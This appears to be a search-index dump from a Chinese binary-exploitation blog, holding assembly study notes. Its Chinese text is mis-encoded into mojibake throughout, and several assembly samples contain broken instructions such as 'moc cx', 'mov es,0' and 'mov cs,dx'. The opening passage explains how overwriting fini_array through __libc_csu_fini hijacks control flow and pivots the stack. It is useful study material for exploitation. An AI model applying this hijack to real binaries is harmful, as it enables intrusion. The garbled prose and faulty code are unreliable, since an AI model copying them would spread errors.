ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨exité€€å‡ºã€‚ __libc_csu_finiå‡½æ•° .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+Fo .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1Bj .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp åœ¨.text:0000000000402988è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªcallæŒ‡ä»¤,ç»“åˆå‰é¢çš„ä»£ç å¯ä»¥çŸ¥é“rbpä¿å­˜çš„æ˜¯fini_arrayçš„å€¼,æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨fini_arrayä¸­çš„å‡½æ•°.æ‰€ä»¥åªè¦ä¿®æ”¹äº†fini_arrayçš„æ•°å€¼,æˆ‘ä»¬å°±å¯ä»¥åŠ«æŒeip.çœ‹ä¸€ä¸‹fini_arrayçš„ä»£ç : .fini_array:``00000000004B40F0` `_fini_array segment para public ``'DATA'` `use64 .fini_array:``00000000004B40F0` `assume cs:_fini_array .fini_array:``00000000004B40F0` `;org ``4B40F0h .fini_array:``00000000004B40F0` `_fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:``000000000040291Co .fini_array:``00000000004B40F0` `; __libc_csu_fini``+``8o .fini_array:``00000000004B40F8` `dq offset sub_401580 .fini_array:``00000000004B40F8` `_fini_array ends è¿™é‡Œä¿å­˜äº†ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆ,åˆ†åˆ«æ˜¯fini_array[0]å’Œfini_array[1],è§‚å¯Ÿlibc_csu_finiä¸­çš„æ±‡ç¼–ä»£ç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™ä¿©å‡½æ•°æŒ‡é’ˆæ˜¯åå‘æ‰§è¡Œçš„,å…ˆæ‰§è¡Œfini_array[1],å†æ‰§è¡Œfini_array[0].å¦‚æœæˆ‘ä»¬å°†fini_array[0]è¦†ç›–ä¸ºlibc_csu_finiçš„åœ°å€,å†å°†fini_array[1]è¦†ç›–ä¸ºä»»æ„ä¸€ä¸ªåœ°å€A,é‚£ä¹ˆç¨‹åºå°±ä¼šå¾ªç¯æ‰§è¡ŒAåœ°å€çš„ä»£ç ,ç›´åˆ°fini_array[0]è¦†ç›–ä¸ºå…¶ä»–å€¼. å…¶æ¬¡,åœ¨.text:0000000000402968å¯ä»¥ä¿®æ”¹rbpä¸ºfini_arrayçš„é¦–åœ°å€,é…åˆleave;retå¯ä»¥æŠŠæ ˆè¿ç§»åˆ°fini_array. å‚è€ƒï¼š__libc_start_main ","date":"2020-10-13","objectID":"/linux-x86-program-start-up/:0:0","series":null,"tags":["Pwn"],"title":"Linux X86 Program Start Up","uri":"/linux-x86-program-start-up/#ç»“æŸ"},{"categories":["Pwning"],"content":"æ±‡ç¼–è¯­è¨€ï¼ˆ3ï¼‰","date":"2020-10-01","objectID":"/assembly-3/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#æ±‡ç¼–è¯­è¨€3"},{"categories":["Pwning"],"content":"13ã€int int n ;nä¸ºä¸­æ–­ç±»å‹ç  ;å¯ä»¥ç”¨ä½œä¸€ç§ç‰¹æ®Šçš„å‡½æ•°è°ƒç”¨æ–¹å¼ã€‚ assume cs:code code segment start: mov ax,cs ;æºç¨‹åºä½ç½® mov ds,ax mov si,offset s0 mov ax,0 ;ç›®æ ‡ç¨‹åºä½ç½® mov es,0 mov di,200h moc cx,offset s0-offset s0end cld ;æ­£å‘ä¼ è¾“å®‰è£… rep movsb mov ax,0 ;æ›´æ–°å‘é‡è¡¨ mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21h ;ä¸‹é¢æ˜¯ä¸­æ–­ç¨‹åºçš„å†…å®¹ s0: mul ax iret s0end: nop code ends end start assume cd:code code segment start: mov ax,cs ;æºç¨‹åºä½ç½® mov ds,ax mov si,offset s0 mov ax,0 ;ç›®æ ‡ç¨‹åºä½ç½® mov es,0 mov di,200h mov cx,offset lp-offset lpend cld ;æ­£å‘ä¼ è¾“å®‰è£… rep movsb mov ax,0 ;æ›´æ–°å‘é‡è¡¨ mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21h ;ä¸‹é¢æ˜¯ä¸­æ–­ç¨‹åºçš„å†…å®¹ lp: push bp mov bp,sp dec cx ;å¤–éƒ¨cxä»£è¡¨å¾ªç¯æ¬¡æ•°ï¼Œéœ€è¦æä¾› jcxz lpret add[bp+2],bx ;bxä»£è¡¨æ‰€å¾ªç¯ç¨‹åºçš„é•¿åº¦ ;ss:[bp+2]ä¸­ä¸ºä¸­æ–­æ‰§è¡Œåçš„IPï¼ŒåŠ ä¸Šé•¿åº¦å°±å›åˆ°äº†ç¨‹åºå¼€å§‹ lpret: pop bp iret lpend: nop code ends end start ","date":"2020-10-01","objectID":"/assembly-3/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#13int"},{"categories":["Pwning"],"content":"14ã€ç«¯å£ç«¯å£ï¼šè®¡ç®—æœºä¸å¤–ç•Œäº¤æµçš„é—¨æˆ·ã€‚ CPUå¯ä»¥ç›´æ¥è¯»å†™3ä¸ªåœ°æ–¹çš„æ•°æ®ï¼šCPUå†…éƒ¨å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒï¼Œç«¯å£ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#14ç«¯å£"},{"categories":["Pwning"],"content":"1ã€åŸºæœ¬æ¦‚å¿µä¸èƒ½ä½¿ç”¨movã€pushã€popï¼Œä½¿ç”¨inï¼Œoutã€‚ in al,60h out 21h,al shl ;é€»è¾‘å·¦ç§» shr ;é€»è¾‘å³ç§» mov ax,36h mov cl,3 shl ax,cl shr ax,cl ;å½“ç§»åŠ¨ä½æ•°å¤§äº1æ—¶ï¼Œå¿…é¡»å°†ç§»åŠ¨ä½æ•°æ”¾å…¥cl ;ç§»åŠ¨1ä½æ—¶ï¼ŒCFä¼šå‚¨å­˜è¢«ç§»å‡ºçš„é‚£ä¸€ä½ ","date":"2020-10-01","objectID":"/assembly-3/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1åŸºæœ¬æ¦‚å¿µ"},{"categories":["Pwning"],"content":"2ã€CMOS RAMèŠ¯ç‰‡CMOS RAMèŠ¯ç‰‡å‚¨å­˜äº†æ—¶é—´ä¿¡æ¯ï¼Œç”±ç”µæ± ä¾›ç”µï¼Œä¿è¯æ—¶é—´æ­£å¸¸è®¡ç®—ã€‚70hä¸ºåœ°å€ç«¯å£ï¼Œ71hä¸ºæ•°æ®ç«¯å£ã€‚ æ•°æ®ä»¥BCDç çš„æ–¹å¼å­˜æ”¾ï¼Œ0~9çš„å››ä½äºŒè¿›åˆ¶ç ã€‚ BCDç +30h=åè¿›åˆ¶æ•°çš„ASCIIç ï¼Œæ‰€ä»¥å–å‡ºæ•°æ®çš„é«˜8ä½å’Œä½8ä½éƒ½è¦åŠ 30hã€‚ mov ah,al ;alä¸­ä½ä»èŠ¯ç‰‡8å·å•å…ƒè¯»å‡ºçš„æ•°æ® mov cl,4 shr ah,cl ;ahä¸­ä½æœˆä»½çš„åä½æ•°ç å€¼ and al,00001111b;alä¸­ä½æœˆä»½çš„ä¸ªä½æ•°ç å€¼ ","date":"2020-10-01","objectID":"/assembly-3/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2cmos-ramèŠ¯ç‰‡"},{"categories":["Pwning"],"content":"15ã€å¤–ä¸­æ–­","date":"2020-10-01","objectID":"/assembly-3/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#15å¤–ä¸­æ–­"},{"categories":["Pwning"],"content":"1ã€åŸºæœ¬æ¦‚å¿µåˆ†ä¸ºå¯å±è”½ä¸­æ–­å’Œä¸å¯å±è”½ä¸­æ–­ã€‚ IF=1,åˆ™CPUæ‰§è¡Œå®Œå½“å‰æŒ‡ä»¤åï¼Œå“åº”ä¸­æ–­ï¼›IF=0ï¼Œåˆ™ä¸å“åº”ã€‚ å‚ç…§ä¸­æ–­å¤„ç†çš„è¿‡ç¨‹ï¼ŒIFç½®0æ˜¯ä¸ºäº†é˜²æ­¢å…¶ä»–ä¸­æ–­çš„å¹²æ‰°ã€‚ stiï¼Œè®¾ç½®IF=1ï¼›cliï¼Œè®¾ç½®IF=0ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1åŸºæœ¬æ¦‚å¿µ-1"},{"categories":["Pwning"],"content":"2ã€é”®ç›˜å¤„ç†æŒ‰ä¸‹ä¸€ä¸ªé”®æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªæ‰«æç ï¼Œç§°ä¸ºé€šç ï¼Œæ¾å¼€æ—¶äº§ç”Ÿçš„æ‰«æç ç§°ä¸ºæ–­ç ã€‚æ‰«æç çš„é•¿åº¦ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œé€šç çš„ç¬¬7ä½ä¸º0ï¼Œæ–­ç çš„ç¬¬ä¸ƒä½ä¸º1ï¼Œå³ï¼šæ–­ç =é€šç +80hã€‚æ‰«æç é€åˆ°60hç«¯å£ã€‚ é”®ç›˜çš„è¾“å…¥åˆ°è¾¾60hç«¯å£æ—¶ï¼Œç›¸å…³èŠ¯ç‰‡å‘é€ä¸­æ–­ç±»å‹ç 9ï¼ŒCPUæ‰§è¡Œint 9ä¸­æ–­ä¾‹ç¨‹å¤„ç†é”®ç›˜è¾“å…¥ã€‚ int 9ä¸­æ–­ä¾‹ç¨‹ï¼Œä¼šäº§ç”Ÿä¸æ‰«æç å¯¹åº”çš„å­—ç¬¦ç ï¼Œæ”¾å…¥BIOSé”®ç›˜ç¼“å†²åŒºï¼Œä¸€ä¸ªé”®ç›˜è¾“å…¥ç”¨ä¸€ä¸ªå­—å•å…ƒå­˜æ”¾ï¼Œé«˜ä½å­—èŠ‚å­˜æ”¾æ‰«æç ï¼Œä½ä½å­—èŠ‚å­˜æ”¾å­—ç¬¦ç ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2é”®ç›˜å¤„ç†"},{"categories":["Pwning"],"content":"3ã€ç¼–å†™int 9ä¸­æ–­ assume cs:code stack segment db 128 dup (0) stack ends data segment dw 0,0 data ends code segment start mov ax,0b800h mov es,ax mov ah,'a' s: mov es:[160*12+40*2],ah call delay inc ah cmp ah,'z' jna s mov ax,4c00h int 21h delay: push ax push dx mov dx,1000h ;å¤–å±‚å¾ªç¯æ•° 1000H mov ax,0 ;å†…å±‚å¾ªç¯æ•°æ˜¯1 0000h s1: sub ax,1 sbb dx,0 cmp ax,0 jne s1 cmp dx,0 jne s1 pop dx pop ax ret code ends end start ","date":"2020-10-01","objectID":"/assembly-3/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#3ç¼–å†™int-9ä¸­æ–­"},{"categories":["Pwning"],"content":"16ã€ç›´æ¥å®šå€è¡¨","date":"2020-10-01","objectID":"/assembly-3/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#16ç›´æ¥å®šå€è¡¨"},{"categories":["Pwning"],"content":"1ã€æ ‡å· a: db 1,2,3,4,5,6,7,8 b: dw 0 ;è¿™é‡Œaï¼Œbè¿›é˜¶è¡¨ç¤ºå†…å­˜å•å…ƒçš„åœ°å€,åé¢åŠ æœ‰â€ï¼šâ€œçš„åœ°å€æ ‡å·ï¼Œåªèƒ½åœ¨ä»£ç æ®µä½¿ç”¨ a db 1,2,3,4,5,6,7,8 b dw 0 ;è¿™é‡Œaï¼ŒbåŒæ—¶æè¿°å†…å­˜åœ°å€å’Œå•å…ƒé•¿åº¦ï¼Œç§°ä¸ºæ•°æ®æ ‡å·ï¼› ;aï¼Œcsï¼š0åçš„å†…å­˜å•å…ƒä¸ºå­—èŠ‚å•å…ƒï¼Œbï¼Œcsï¼š8åçš„å†…å­˜å•å…ƒä¸ºå­—å•å…ƒ mov ax,b ;mov ax,cs:[8] mov b,2 ;mov word ptr cs:[8],2 inc b ;inc word ptr cs:[8] mov al,a[bx+si+3] ;mov al,cs:0[bx+si+3] seg ;å–å¾—æŸä¸€æ ‡å·çš„æ®µåœ°å€ ","date":"2020-10-01","objectID":"/assembly-3/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1æ ‡å·"},{"categories":["Pwning"],"content":"2ã€ç›´æ¥å®šå€è¡¨é€šè¿‡ä½ç§»å»ºç«‹æ•°æ®ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¾æ®æ•°æ®ï¼Œç›´æ¥è®¡ç®—å‡ºæ‰€è¦æ‰¾çš„å…ƒç´ çš„ä½ç½®çš„è¡¨ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2ç›´æ¥å®šå€è¡¨"},{"categories":["Pwning"],"content":"17ã€ä½¿ç”¨BIOSè¿›è¡Œé”®ç›˜è¾“å…¥å’Œç£ç›˜è¯»å†™int 9hä¸­æ–­å°†é”®ç›˜çš„è¾“å…¥æ•°æ®æ”¾å…¥é”®ç›˜ç¼“å†²åŒº int 16hå°†ahä½œä¸ºå‚æ•°ä¼ é€’å¯„å­˜å™¨ï¼Œä»é”®ç›˜è¯»å–ä¸€ä¸ªè¾“å…¥ï¼Œå¹¶å°†å…¶ä»ç¼“å†²åŒºåˆ é™¤ã€‚ æ£€æµ‹é”®ç›˜ç¼“å†²åŒºä¸­æ˜¯å¦æœ‰æ•°æ® æ²¡æœ‰åˆ™ç»§ç»­ç¬¬ä¸€æ­¥ è¯»å–ç¼“å†²åŒºç¬¬ä¸€ä¸ªå­—å•å…ƒçš„é”®ç›˜è¾“å…¥ å°†è¯»å–çš„æ‰«æç é€å…¥ahï¼ŒASCIIé€å…¥alï¼› å°†å·²è¯»å–çš„é”®ç›˜è¾“å…¥ä»ç¼“å†²åŒºä¸­åˆ é™¤ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#17ä½¿ç”¨biosè¿›è¡Œé”®ç›˜è¾“å…¥å’Œç£ç›˜è¯»å†™"},{"categories":["Pwning"],"content":"1ã€å­—ç¬¦ä¸²ä½¿ç”¨æ ˆå¤„ç†å­—ç¬¦ä¸²çš„è¾“å…¥ï¼Œ è°ƒç”¨int 16hè¯»å–é”®ç›˜è¾“å…¥ï¼› å¦‚æœæ˜¯å­—ç¬¦ï¼Œè¿›å…¥å­—ç¬¦æ ˆï¼Œæ˜¾ç¤ºå­—ç¬¦æ ˆä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼›ç»§ç»­æ‰§è¡Œ1ï¼› å¦‚æœæ˜¯é€€æ ¼é”®ï¼Œä»å­—ç¬¦æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œæ˜¾ç¤ºå­—ç¬¦æ ˆä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼›ç»§ç»­æ‰§è¡Œ1ï¼› å¦‚æœæ˜¯Enteré”®ï¼Œå‘å­—ç¬¦æ ˆä¸­å‹å…¥0ï¼Œè¿”å›ã€‚ ","date":"2020-10-01","objectID":"/assembly-3/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1å­—ç¬¦ä¸²"},{"categories":["Pwning"],"content":"æ±‡ç¼–è¯­è¨€ï¼ˆ2ï¼‰","date":"2020-10-01","objectID":"/assembly-2/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#æ±‡ç¼–è¯­è¨€2"},{"categories":["Pwning"],"content":"8ã€æ•°æ®å¤„ç†","date":"2020-10-01","objectID":"/assembly-2/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#8æ•°æ®å¤„ç†"},{"categories":["Pwning"],"content":"1ã€bxï¼Œsiï¼Œdiï¼Œbpregï¼ˆå¯„å­˜å™¨ï¼‰ï¼šaxã€bxã€cxã€dxã€ahã€alã€bhã€blã€chã€clã€dhã€dlã€spã€bpã€siã€diï¼› sregï¼ˆæ®µå¯„å­˜å™¨ï¼‰ï¼šdsã€ssã€csã€esï¼ˆæ‰©å±•æ®µï¼Œè¾…åŠ©ä½œç”¨ï¼‰ï¼› åªæœ‰è¿™å››ä¸ªå¯„å­˜å™¨ç”¨åœ¨â€œ[â€¦]â€ä¸­æ¥è¿›è¡Œå†…å­˜å•å…ƒçš„å¯»å€ã€‚ ä¸‹é¢è¿™ä¸¤ç§è¯­æ³•æ˜¯é”™è¯¯çš„ mov ax,[si+di] mov sx,[bx+bp] è‹¥åœ¨â€œ[â€¦]â€ä¸­ä½¿ç”¨bpï¼Œè€ŒæŒ‡ä»¤æ²¡æœ‰æ˜¾æ€§ç»™å‡ºæ®µåœ°å€æ—¶ï¼Œæ®µåœ°å€é»˜è®¤åœ¨ssä¸­ã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:1:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1bxsidibp"},{"categories":["Pwning"],"content":"2ã€æ•°æ®çš„é•¿åº¦åœ¨æ²¡æœ‰å¯„å­˜å™¨åå­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œç”¨æ“ä½œç¬¦X ptræŒ‡æ˜å†…å­˜å•å…ƒçš„é•¿åº¦ï¼ŒXåœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­å¯ä»¥ä¸ºwordæˆ–byteã€‚ mov word ptr ds:[0],1 inc word ptr ds:[0] inc byte ptr ds:[0] add byte ptr [bx],2 push,popåªå¯¹å­—è¿›è¡Œæ“ä½œã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:1:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2æ•°æ®çš„é•¿åº¦"},{"categories":["Pwning"],"content":"3ã€ç»“æ„ä½“ mov ax,seg mov ds,ax mov bx,60h mov word ptr [bx+0ch],38 ;ä¸€ä¸ªæ•°æ®æ®µä¸­ç´§æŒ¨ç€å­˜æ”¾äº†ä¸åŒçš„ä¿¡æ¯ mov word ptr [bx+0eh],70 ;ç±»ä¼¼cè¯­è¨€çš„ç»“æ„ä½“ mov si,0 mov byte ptr [bx+10+si],'V' inc si mov byte ptr [bx+10+si],'A' inc si mov byte ptr [bx+10+si],'X' ","date":"2020-10-01","objectID":"/assembly-2/:1:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3ç»“æ„ä½“"},{"categories":["Pwning"],"content":"4ã€divè¢«é™¤æ•°é»˜è®¤æ”¾åœ¨AXæˆ–AXå’ŒDXä¸­ï¼Œè‹¥é™¤æ•°ä¸º8ä½ï¼Œåˆ™è¢«é™¤æ•°ä½16ä½ï¼Œåœ¨axä¸­å­˜æ”¾ï¼›è‹¥é™¤æ•°ä¸º16ä½ï¼Œè¢«é™¤æ•°ä½32ä½ï¼Œåœ¨DXå’ŒAXä¸­å­˜æ”¾ï¼Œaxå­˜æ”¾ä½16ä½ã€‚ ;æ ¼å¼ ;div reg ;div å†…å­˜å•å…ƒ div byte ptr ds:[0] ;(a1)=(ax)/((ds)*16+0)çš„å•† ;(ah)=(ax)/((ds)*16+0)çš„ä½™æ•° div word ptr es:[0] ;(ax)=[(dx)*10000H+(ax)]/((es)*16+0)çš„å•† ;(bx)=[(dx)*10000H+(ax)]/((es)*16+0)çš„ä½™æ•° ","date":"2020-10-01","objectID":"/assembly-2/:1:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4div"},{"categories":["Pwning"],"content":"9ã€è½¬ç§»æŒ‡ä»¤","date":"2020-10-01","objectID":"/assembly-2/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#9è½¬ç§»æŒ‡ä»¤"},{"categories":["Pwning"],"content":"1ã€offset mov ax,offset start ;å–å¾—æ ‡å·çš„åç§»åœ°å€ ","date":"2020-10-01","objectID":"/assembly-2/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1offset"},{"categories":["Pwning"],"content":"2ã€jmpè§‚å¯Ÿæœºå™¨ç ï¼Œå¯ä»¥å‘ç°ç«‹å³æ•°ï¼ˆidataï¼‰ä¼šåœ¨æœºå™¨ç ä¸­æœ‰æ‰€ä½“ç°ã€‚jmpæŒ‡ä»¤æœºå™¨ç ä¸­ä»¥è¡¥ç çš„å½¢å¼ä½“ç°ã€‚ cs:0000 mov ax,0123h ;B8 23 01 cs:0003 jmp s ;EB 03ï¼Œæ‰§è¡Œjmpåï¼Œip+2å˜ä¸º05 cs:0005 add ax,1 ;å®é™…ä½œç”¨æ˜¯jmpæ‰§è¡Œåå‘ä¸‹è·³3ä¸ªå­—èŠ‚ cs:0008 s: inc ax ;jmpå°†ip=ip+03=08,03ä¸ºè¡¥ç çš„åå…­è¿›åˆ¶ jmp short s ;æ®µå†…çŸ­è½¬ç§»ï¼Œï¼ˆipï¼‰=ï¼ˆipï¼‰+8ä½ä½ç§» jmp near ptr s ;æ®µå†…è¿‘è½¬ç§»ï¼Œï¼ˆipï¼‰=ï¼ˆipï¼‰+16ä½ä½ç§» jmp far ptr s ;æ®µé—´è½¬ç§»ï¼Œç›´æ¥ä¿®æ”¹csï¼šip jmp word ptr å†…å­˜åœ°å€å•å…ƒ ;æ®µå†…è¿‘è½¬ç§»ï¼Œï¼ˆipï¼‰=(å†…å­˜åœ°å€å•å…ƒ) jmp dword ptr å†…å­˜åœ°å€å•å…ƒ;æ®µé—´è½¬ç§» ;(cs)=(å†…å­˜åœ°å€å•å…ƒ+2),(ip)=(å†…å­˜åœ°å€å•å…ƒ) ","date":"2020-10-01","objectID":"/assembly-2/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2jmp"},{"categories":["Pwning"],"content":"3ã€jcxz jcxz æ ‡å· ;if((cx)==0) ; jmp æ ‡å· ","date":"2020-10-01","objectID":"/assembly-2/:2:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3jcxz"},{"categories":["Pwning"],"content":"10ã€CALLå’ŒRETæŒ‡ä»¤","date":"2020-10-01","objectID":"/assembly-2/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#10callå’ŒretæŒ‡ä»¤"},{"categories":["Pwning"],"content":"1ã€retå’Œretf ret ;ç­‰ä»·äºpop ip ;(ip)=((ss)*16+(sp)) ;(sp)=(sp)+2 retf ;ç­‰ä»·äºpop ip,pop cs ;(ip)=((ss)*16+(sp)) ;(sp)=(sp)+2 ;(cs)=((ss)*16+(sp)) ;(sp)=(sp)+2 ","date":"2020-10-01","objectID":"/assembly-2/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1retå’Œretf"},{"categories":["Pwning"],"content":"2ã€call call s ;(sp)=(sp)-2 push ip ;((ss)*16+(sp))=(ip) ;(ip)=(ip)+16ä½ä½ç§» jmp near ptr æ ‡å· ;16ä½ä½ç§»=æ ‡å·å¤„åœ°å€-callæŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€ call far ptr s ;(sp)=(sp)-2 push cs ;((ss)*16+(sp))=(cs) push ip ;(sp)=(sp)-2 ;((ss)*16+(sp))=(ip) ;(cs)=æ ‡å·æ‰€åœ¨çš„æ®µåœ°å€ jmp far ptr æ ‡å· ;(ip)=æ ‡å·åœ¨æ®µä¸­çš„åç§»åœ°å€ call 16ä½reg ;(sp)=(sp)-2 ;((ss)*16+(sp))=(cs) ;(ip)=(16ä½reg) call word ptr å†…å­˜å•å…ƒåœ°å€ ;push ip ;jmp word ptr å†…å­˜å•å…ƒåœ°å€ call dword ptr å†…å­˜å•å…ƒåœ°å€ ;push cs ;push ip ;jmp dword ptr å†…å­˜å•å…ƒåœ°å€ ","date":"2020-10-01","objectID":"/assembly-2/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2call"},{"categories":["Pwning"],"content":"4ã€mul mul reg mul å†…å­˜å•å…ƒ mul byte ptr ds:[0] ;(ax)=(al)*((ds)*16+0) mul word ptr [bx+si+8] ;(ax)=(ax)*((ds)*16+(bx)+(si)+8)ç»“æœçš„ä½16ä½ ;(dx)=(ax)*((ds)*16+(bx)+(si)+8)ç»“æœçš„é«˜16ä½ ","date":"2020-10-01","objectID":"/assembly-2/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4mul"},{"categories":["Pwning"],"content":"5ã€å®éªŒ assume cs:code data segment data ends stack segment dw 8 dup(0) stack ends code segment start: mov ax,stack mov ss,ax mov sp,10h mov ax,4240h mov dx,0fh mov cx,0ah call divdw mov ax, int 21h divdw: push ax ;ä¿å­˜ä½16ä½ mov ax,dx ;axæ­¤æ—¶ä½H mov dx,0 div cx ;é«˜16ä½é™¤ä»¥é™¤æ•° mov bx,ax ;H/Nçš„å•†ï¼Œæ”¾å…¥é«˜ä½å•†çš„å‚¨å­˜ä½ç½® pop ax div cx ;ä½16ä½é™¤ä»¥é™¤æ•° mov cs,dx mov dx,bx ret code ends end start ","date":"2020-10-01","objectID":"/assembly-2/:3:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#5å®éªŒ"},{"categories":["Pwning"],"content":"11ã€æ ‡å¿—å¯„å­˜å™¨flagå¯„å­˜å™¨æœ‰16ä½ï¼Œå…¶ä¸­å‚¨å­˜çš„ä¿¡æ¯è¢«ç§°ä¸ºç¨‹åºçŠ¶æ€å­—ï¼ˆPSWï¼‰ã€‚ ä½œç”¨ï¼š ï¼ˆ1ï¼‰ç”¨æ¥å‚¨å­˜ç›¸å…³æŒ‡ä»¤çš„æŸäº›æ‰§è¡Œç»“æœï¼› ï¼ˆ2ï¼‰ç”¨æ¥ä¸ºCPUæ‰§è¡Œç›¸å…³æŒ‡ä»¤æä¾›è¡Œä¸ºä¾æ®ï¼› ï¼ˆ3ï¼‰ç”¨æ¥æ§åˆ¶CPUçš„ç›¸å…³å·¥ä½œæ–¹å¼ã€‚ å€¼ 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 flag OF DF IF TF SF ZF AF PF CF 1 OV DN NG ZR PE CY 0 NV UP PL NZ PO NC flagçš„1ã€3ã€5ã€12ã€3ã€14ã€15æ²¡æœ‰ä»»ä½•å«ä¹‰ã€‚å…¶ä»–æœ‰ç‰¹æ®Šå«ä¹‰ã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#11æ ‡å¿—å¯„å­˜å™¨"},{"categories":["Pwning"],"content":"1ã€ZFã€PFã€SFã€CFã€OFZFï¼ˆé›¶æ ‡å¿—ä½ï¼‰ï¼šæŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœä¸º0ï¼Œåˆ™ZF=1ï¼Œå¦åˆ™ä¸º0ã€‚ PFï¼ˆå¥‡å¶æ ‡å¿—ä½ï¼‰ï¼šæŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœä¸ºå¶æ•°ï¼Œåˆ™PF=1ï¼Œå¦åˆ™ä¸º0ã€‚ SFï¼ˆç¬¦å·æ ‡å¿—ä½ï¼‰ï¼šæŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœä¸ºè´Ÿæ•°ï¼Œåˆ™SF=1ï¼Œå¦åˆ™ä¸º0ã€‚ å½“æˆ‘ä»¬å°†æ•°æ®å½“ä½œæœ‰ç¬¦å·æ•°æ¥è¿ç®—æ—¶ï¼ŒSFæ ‡å¿—ä½æ‰æœ‰æ„ä¹‰ CFï¼ˆè¿›ä½æ ‡å¿—ä½ï¼‰ï¼šåœ¨è¿›è¡Œæ— ç¬¦å·æ•°è¿ç®—çš„æ—¶å€™ï¼Œå®ƒè®°å½•äº†è¿ç®—ç»“æœçš„æœ€é«˜æœ‰æ•ˆä½å‘æ›´é«˜ä½çš„è¿›ä½å€¼ã€‚ ä¾‹å¦‚ï¼Œä¸¤ä¸ªå…«ä½æ•°æ®ï¼š98H+98Hï¼Œå°†äº§ç”Ÿè¿›ä½ï¼Œ8ä½æ•°æ— æ³•ä¿å­˜ï¼Œæ›´é«˜çš„ä½è¢«è®°å½•åœ¨CFä¸­ã€‚ 